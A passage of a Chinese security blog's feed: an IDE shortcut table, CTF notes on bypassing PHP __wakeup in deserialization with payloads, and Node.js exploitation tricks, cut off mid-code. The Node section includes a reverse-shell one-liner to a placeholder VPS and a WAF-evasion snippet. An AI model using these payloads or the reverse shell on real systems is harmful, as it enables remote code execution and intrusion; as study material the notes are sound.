class="even"><td>Find</td><td><strong>Ctrl+F</strong></td><td>在当前文件中查找</td></tr><tr class="odd"><td>Replace</td><td><strong>Ctrl+R</strong></td><td>替换字符串</td></tr><tr class="even"><td>Find in Path</td><td><strong>Ctrl+Shift+F</strong></td><td>在全局文件中查找字符串</td></tr><tr class="odd"><td>Replace in Path</td><td><strong>Ctrl+Shift+R</strong></td><td>在全局中替换字符串</td></tr><tr class="even"><td>Find Usages</td><td>Alt+F7</td><td>查找当前变量的使用，并列表显示</td></tr><tr class="odd"><td>Show Usages</td><td>Ctrl+Alt+F7</td><td>查找当前变量的使用，并直接对话框显示</td></tr><tr class="even"><td>Find Usages in File</td><td>Ctrl+F7</td><td>在文件中查找符号的使用</td></tr><tr class="odd"><td>Highlight Usages in File</td><td>Ctrl+Shift+F7</td><td>在文件中高亮显示变量的使用</td></tr><tr class="even"><td>Class…</td><td><strong>Ctrl+N</strong></td><td>查找类文件</td></tr><tr class="odd"><td>File…</td><td><strong>Ctrl+Shift+N</strong></td><td>查找文件</td></tr><tr class="even"><td>Line…</td><td><strong>Ctrl+G</strong></td><td>定位到文件某一行</td></tr><tr class="odd"><td>Back</td><td>Alt+向左箭头</td><td>返回至上次光标位置</td></tr><tr class="even"><td>Forward</td><td>Alt+向右箭头</td><td>返回至后一次光标位置</td></tr><tr class="odd"><td>Last Edit Location</td><td>Ctrl+Shift+Backspace</td><td>返回上次编辑位置</td></tr><tr class="even"><td>Next Edit Location</td><td>Ctrl+Shift+反斜杠</td><td>返回后一次编辑位置</td></tr><tr class="odd"><td>Declaration</td><td>Ctrl+B</td><td>定位至变量定义的位置</td></tr><tr class="even"><td>Implementation(s)</td><td>Ctrl+Alt+B</td><td>定位至选中类或方法的具体实现</td></tr><tr class="odd"><td>Type Declaration</td><td>Ctrl+Shift+B</td><td>直接定位至光标所在变量的类型定义</td></tr><tr class="even"><td>Super Method</td><td>Ctrl+U</td><td>直接定位至当前方法override或者implements的方法定义处</td></tr><tr class="odd"><td>File Structure</td><td>Ctrl+F12</td><td>显示当前文件的文件结构</td></tr><tr class="even"><td>File Path</td><td>Ctrl+Alt+F12</td><td>显示当前文件的路径，并可以方便的将相关父路径打开</td></tr><tr class="odd"><td>Type Hierarchy</td><td>Ctrl+H</td><td>显示当前类的继承层次</td></tr><tr class="even"><td>Method Hierarchy</td><td>Ctrl+Shift+H</td><td>显示当前方法的继承层次</td></tr><tr class="odd"><td>Call Hierarchy</td><td>Ctrl+Alt+H</td><td>显示当前方法的调用层次</td></tr><tr class="even"><td>Next Highlighted Error</td><td>F2</td><td>定位至下一个错误处</td></tr><tr class="odd"><td>Previous Highlighted Error</td><td>Shift+F2</td><td>定位至前一个错误处</td></tr><tr class="even"><td>Previous Occurrence</td><td>Ctrl+Alt+向上箭头</td><td>查找前一个变量共现的地方</td></tr><tr class="odd"><td>Next Occurrence</td><td>Ctrl+Alt+向下箭头</td><td>查找下一个变量共现的地方</td></tr><tr class="even"><td>Override Methods…</td><td>Ctrl+O</td><td>重写基类的方法</td></tr><tr class="odd"><td>Implement Methods…</td><td>Ctrl+I</td><td>实现基类或接口中的方法</td></tr><tr class="even"><td>Generate…</td><td>Alt+Insert</td><td>产生构造方法、getter/setter等方法</td></tr><tr class="odd"><td>Surround With…</td><td>Ctrl+Alt+T</td><td>将选中的代码使用if、while、try/catch等包装</td></tr><tr class="even"><td>Unwrap/Remove…</td><td>Ctrl+Shift+Delete</td><td>去除相关的包装代码</td></tr><tr class="odd"><td>Basic</td><td>Alt+/</td><td>自动完成</td></tr><tr class="even"><td>SmartType</td><td>Alt+Enter</td><td>自动提示完成</td></tr><tr class="odd"><td>Expand</td><td>Ctrl+=</td><td>展开代码</td></tr><tr class="even"><td>Collapse</td><td>Ctrl+-</td><td>收缩代码</td></tr><tr class="odd"><td>Expand Recursively</td><td>Ctrl+Alt+=</td><td>递归展开代码</td></tr><tr class="even"><td>Collapse Recursively</td><td>Ctrl+Alt+-</td><td>递归收缩代码</td></tr><tr class="odd"><td>Expand All</td><td>Ctrl+Shift+=</td><td>展开所有代码</td></tr><tr class="even"><td>Collapse All</td><td>Ctrl+Shift+-</td><td>收缩所有代码</td></tr><tr class="odd"><td>Insert Live Template</td><td>Ctrl+J</td><td>插入Live Template</td></tr><tr class="even"><td>Surround with Live Template</td><td>Ctrl+Alt+J</td><td>使用Live Template包装</td></tr><tr class="odd"><td>Comment with Line Comment</td><td><strong>Ctrl+/</strong></td><td>使用//进行注释</td></tr><tr class="even"><td>Comment with Block Comment</td><td><strong>Ctrl+Shift+/</strong></td><td>使用/**/进行注释</td></tr><tr class="odd"><td>Reformat Code</td><td><strong>Ctrl+Alt+L</strong></td><td>格式化代码</td></tr><tr class="even"><td>Auto-Indent Lines</td><td>Ctrl+Alt+I</td><td>自动缩进行</td></tr><tr class="odd"><td>Optimize Imports</td><td>Ctrl+Alt+O</td><td>优化import</td></tr><tr class="even"><td>Move Statement Down</td><td>Ctrl+Shift+向下箭头</td><td>将光标所在的代码块向下整体移动</td></tr><tr class="odd"><td>Move Statement Up</td><td>Ctrl+Shift+向上箭头</td><td>将光标所在的代码块向上移动</td></tr><tr class="even"><td>Move Element Left</td><td>Ctrl+Alt+Shift+向左箭头</td><td>将元素向左移动</td></tr><tr class="odd"><td>Move Element Right</td><td>Ctrl+Alt+Shift+向右箭头</td><td>将元素向右移动</td></tr><tr class="even"><td>Move Line Down</td><td>Alt+Shift+向下箭头</td><td>将行向下移动</td></tr><tr class="odd"><td>Move Line Up</td><td>Alt+Shift+向上箭头</td><td>将行向上移动</td></tr><tr class="even"><td>Rename</td><td>Shift+F6</td><td>重命名</td></tr><tr class="odd"><td>Change Signature</td><td>Ctrl+F6</td><td>更改函数签名</td></tr><tr class="even"><td>Type Migration</td><td>Ctrl+Shift+F6</td><td>更改类型</td></tr></tbody></table><h2 id="六报错及解决">六、报错及解决</h2><h3 id="错误的java发行版">6.1、错误的Java发行版</h3><p>具体信息：java: 错误: 无效的源发行版：17</p><p><a href="https://blog.csdn.net/weixin_44299027/article/details/120848738">JDK版本不一致</a></p><h3 id="类文件具有错误的版本-61.0-应为-52.0">6.2、类文件具有错误的版本 61.0, 应为 52.0</h3><p><a href="https://blog.csdn.net/simonchi/article/details/126625381">Spring6往上版本不支持低版本JDK</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>notes</tag>
      
      <tag>Code Audit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化绕过 wakeup 总结</title>
    <link href="/2023/08/26/blog0032-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-wakeup%E6%80%BB%E7%BB%93/"/>
    <url>/2023/08/26/blog0032-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-wakeup%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>上次某个比赛看到PHP反序列化的__wakeup绕过，发现自己竟然只知道利用属性个数异常的来绕过一种方法。确实是比赛打得太少了，很多trick都不知道，特地找了些博客去分析了一下。</p><p>推荐博客：<a href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">php wakeup绕过</a></p><h2 id="cve-2016-7124">1、CVE-2016-7124</h2><p>影响范围：</p><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul><p>这个是我学习PHP反序列化绕过学习到的第一个姿势。</p><p>以下面这个简单的例子进行说明：</p><p>这个代码的实现非常简单，只要能够绕过wakeup就能实现任意的代码运行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">trick</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$code</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;code = <span class="hljs-variable">$code</span>;            <br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;code = <span class="hljs-string">&quot;echo hello;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br>unserialize(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;trick&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>假如没有<code>__wakeup</code>，POST如下数值即可实现</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">trick</span>=O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;trick&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;phpinfo();&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>此时我们只需要修改php反序列类的属性个数，即可实现对wakeup的绕过</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">trick</span>=O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;trick&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;phpinfo();&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>成功拿到phpinfo信息</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0032/image-20230915144536182.png" alt="image-20230915144536182" /></p><h2 id="fast-destruct绕过wakeup">2、fast destruct绕过wakeup</h2><h3 id="构造链式关系">2.1、构造链式关系</h3><p>在看fast destruct之前，我们先来看一下php的wakeup与destruct的链式关系。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$attr</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;A wakeup &quot;</span>;    <br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;A destruct &quot;</span>;<br>    &#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$attr</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;B wakeup &quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;B destruct &quot;</span>;<br>    &#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;C wakeup &quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;C destruct &quot;</span>;<br>    &#125;<br>&#125;;<br><br><span class="hljs-variable">$v1</span> = <span class="hljs-keyword">new</span> A();<br><span class="hljs-variable">$v2</span> = <span class="hljs-keyword">new</span> B();<br><span class="hljs-variable">$v3</span> = <span class="hljs-keyword">new</span> C();<br><br><span class="hljs-variable">$v2</span>-&gt;attr = <span class="hljs-variable">$v3</span>;<br><span class="hljs-variable">$v1</span>-&gt;attr = <span class="hljs-variable">$v2</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>很显然可以看到这里的链式关系是 A -&gt; B -&gt; C（-&gt;代表拥有）</p><h3 id="正常反序列化">2.2、正常反序列化</h3><p>输出结果如下，可以发现php类释放时，先调用自身的destruct方法，才释放属性。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">A <span class="hljs-built_in">destruct</span> B <span class="hljs-built_in">destruct</span> C <span class="hljs-built_in">destruct</span><br></code></pre></td></tr></table></figure><p>那么我们现在尝试如下代码，看看在有wakeup的基础下会发生什么。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ser</span> = <span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;attr&quot;;O:1:&quot;B&quot;:1:&#123;s:4:&quot;attr&quot;;O:1:&quot;C&quot;:0:&#123;&#125;&#125;&#125;&#x27;</span>;<br>unserialize(<span class="hljs-variable">$ser</span>);<br></code></pre></td></tr></table></figure><p>输出结果如下，可以发现php类反序列化时会递归调用属性的wakeup。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">C wakeup <span class="hljs-selector-tag">B</span> wakeup <span class="hljs-selector-tag">A</span> wakeup <span class="hljs-selector-tag">A</span> destruct <span class="hljs-selector-tag">B</span> destruct C destruct<br></code></pre></td></tr></table></figure><h3 id="异常反序列化">2.3、异常反序列化</h3><p>在此基础上，我们引入新的姿势，PHP反序列化发生异常时，会直接调用destruct方法。</p><p>此处我们加上了A的一个属性，从而导致反序列化发生异常，从而发生了destruct的调用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ser</span> = <span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;attr&quot;;O:1:&quot;B&quot;:1:&#123;s:4:&quot;attr&quot;;O:1:&quot;C&quot;:0:&#123;&#125;&#125;;1&#125;&#x27;</span>;<br>unserialize(<span class="hljs-variable">$ser</span>);<br></code></pre></td></tr></table></figure><p>输出结果如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">C wakeup B wakeup A wakeup A destruct B destruct C destruct<br></code></pre></td></tr></table></figure><p>这里我们再补充一个姿势，可以再额外验证。</p><ul><li>php反序列化时，递归为对象分配内存空间。然后才调用wakeup方法</li><li>对于同一个对象，即使发生异常，也是先调用wakeup再调用destruct</li></ul><p>为了更好地说明问题，我们将A的wakeup注释，再次尝试异常反序列化。</p><p>输出结果如下，可以发现先调用了A的destruct</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">A <span class="hljs-built_in">destruct</span> C wakeup B wakeup B <span class="hljs-built_in">destruct</span> C <span class="hljs-built_in">destruct</span><br></code></pre></td></tr></table></figure><h3 id="攻击方式总结">2.4、攻击方式总结</h3><p>假设此时C的一个非destruct类中存在危险函数（但是涉及到的属性会被C的wakeup给清除）。</p><p>如果可以构造以A的destruct为起点的POP链，那么我们就能够成功绕过C的wakeup，从而实现我们的攻击。</p><p>fast destruct的可利用模式总结：</p><ol type="1"><li>攻击起点为类A的__destruct魔术方法，终点为类C的非__destruct魔术方法</li><li>类A不存在wakeup方法</li><li>触发类A反序列化异常，从而引动POP链</li></ol><h2 id="c绕过">3、C绕过</h2><p>这个算是非常trick的一个点了。</p><p>将一个对象的O属性改为C，则可以绕过wakeup，但是这样无法传值，也只能利用__destruct来实现攻击。</p><p>测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">2</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Saferman</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span> = <span class="hljs-string">&quot;phpinfo();&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;bypass!!&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;catch!!&quot;</span>;<br><span class="hljs-keyword">$this</span>-&gt;code = <span class="hljs-string">&quot;echo hello;&quot;</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>我们构造如下的payload即可实现绕过</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;C</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;Saferman&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;&#x27;<br></code></pre></td></tr></table></figure><p>在某些版本可以使用ArrayObject将需要的类封装起来从而实现在C绕过中为类赋值。但是攻击面还是很狭窄的。</p><p>具体想要了解的可以参考这题：<a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">C绕过trick</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>ctf</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nodejs安全特性总结</title>
    <link href="/2023/07/20/blog0030-node.js%E5%AE%89%E5%85%A8%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/"/>
    <url>/2023/07/20/blog0030-node.js%E5%AE%89%E5%85%A8%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>node.js的相关安全问题之前在比赛中一直有遇到，一般都是现学现卖。</p><p>今天顺便也总结一下相关的payload。</p><h2 id="大小写绕过">大小写绕过</h2><p>toUpperCase()</p><p>字符<code>"ı"</code>经过处理后结果为 <code>"I"</code></p><p>字符<code>"ſ"</code> 经过处理后结果为<code>"S"</code></p><p>toLowerCase()</p><p>字符<code>"İ"</code>经过处理后变成<code>"i "</code></p><p>字符<code>"K"</code>经过处理后结果为<code>"k"</code></p><p>这个神奇的trick是p牛之前fuzz出来的，参考博客如下：</p><p><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">node.js大小写转换函数fuzz</a></p><h2 id="危险函数">危险函数</h2><h3 id="命令执行">命令执行</h3><p>在node.js中，执行系统命令的代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).spawnSync(<span class="hljs-string">&#x27;ls&#x27;</span>,[<span class="hljs-string">&#x27;/&#x27;</span>]).stdout.toString()<br><span class="hljs-built_in">global</span>.process.mainModule.constructor._load(<span class="hljs-string">&#x27;child_process&#x27;</span>).exec(<span class="hljs-string">&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/&#123;vps ip&#125;/2333 0&gt;&amp;1\&quot;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>绕过字符串匹配的waf</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)[<span class="hljs-string">&quot;exe&quot;</span>+<span class="hljs-string">&quot;cSync&quot;</span>](<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="代码执行">代码执行</h3><p>node.js中也有相应的代码执行的函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure><p>除了eval之外，再介绍一个Function</p><p><code>Function</code> 是 JavaScript 中的一个内置对象和函数构造函数。它可以用来创建新的函数对象。</p><p>具体来说，通过 <code>new Function()</code> 或者直接将函数体作为字符串传递给 <code>Function</code> 构造函数，可以动态地创建一个函数。</p><p>函数参数是以字符串形式传递的，它们是函数在被调用时接收的值（也就是下面例子中的x，y）。函数体是一个字符串，表示函数的实际代码。</p><p>举个例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> add = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Function</span>(<span class="hljs-string">&#x27;num1&#x27;</span>, <span class="hljs-string">&#x27;num2&#x27;</span>, <span class="hljs-string">&#x27;return num1 + num2;&#x27;</span>);<br><span class="hljs-built_in">console</span>.log(add(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>)); <span class="hljs-comment">// 输出 8</span><br><br><span class="hljs-keyword">var</span> multiply = <span class="hljs-built_in">Function</span>(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;return x * y;&#x27;</span>);<br><span class="hljs-built_in">console</span>.log(multiply(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>)); <span class="hljs-comment">// 输出 8</span><br></code></pre></td></tr></table></figure><h2 id="弱类型比较">弱类型比较</h2><p>这里其实就是js经典弱比较导致的一堆锅</p><ul><li>数字与纯数字字符串比较时，会将纯数字字符串转换成数字比较</li><li>[]与[]比较恒为False</li><li>数组之间比较只比较第一个元素的值</li><li>数组取第一个元素与字符串比较</li></ul><p>这个就纯属trick了，我觉得还是见到了再收集吧</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;1&#x27;</span>==<span class="hljs-number">1</span>)  <span class="hljs-comment">// true</span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;2&#x27;</span>&gt;<span class="hljs-number">1</span>)   <span class="hljs-comment">// true</span><br><span class="hljs-built_in">console</span>.log([]==[])  <span class="hljs-comment">// false</span><br><span class="hljs-built_in">console</span>.log(&#123;&#125;==&#123;&#125;)  <span class="hljs-comment">// false</span><br><span class="hljs-built_in">console</span>.log([<span class="hljs-number">2</span>,<span class="hljs-number">100</span>,<span class="hljs-number">2</span>]&gt;[<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]) <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p>还有一些特殊的比较</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">console</span>.log(<span class="hljs-literal">null</span>==<span class="hljs-literal">undefined</span>)  <span class="hljs-comment">// true</span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-literal">null</span>===<span class="hljs-literal">undefined</span>) <span class="hljs-comment">// false</span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-literal">NaN</span>==<span class="hljs-literal">NaN</span>)         <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><h2 id="变量拼接">变量拼接</h2><p>这个也是非常trick了，主要是各种类型的拼接</p><p>比如数组+字符串</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">console</span>.log(<span class="hljs-number">5</span>+[<span class="hljs-number">6</span>,<span class="hljs-number">6</span>]);       <span class="hljs-comment">//56,3 </span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;5&quot;</span>+<span class="hljs-number">6</span>);         <span class="hljs-comment">//56 </span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;5&quot;</span>+[<span class="hljs-number">6</span>,<span class="hljs-number">6</span>]);     <span class="hljs-comment">//56,6 </span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;5&quot;</span>+[<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;6&quot;</span>]); <span class="hljs-comment">//56,6</span><br></code></pre></td></tr></table></figure><h2 id="md5绕过">MD5绕过</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">md5(&#123;<span class="hljs-attr">x</span>:<span class="hljs-number">1</span>&#125;+<span class="hljs-string">&quot;123&quot;</span>)==md5(&#123;<span class="hljs-attr">x</span>:<span class="hljs-number">2</span>&#125;+<span class="hljs-string">&quot;123&quot;</span>)<br><span class="hljs-built_in">console</span>.log([<span class="hljs-number">1</span>]!==[<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h2 id="url畸变">URL畸变</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?q</span>uery=&#123;<span 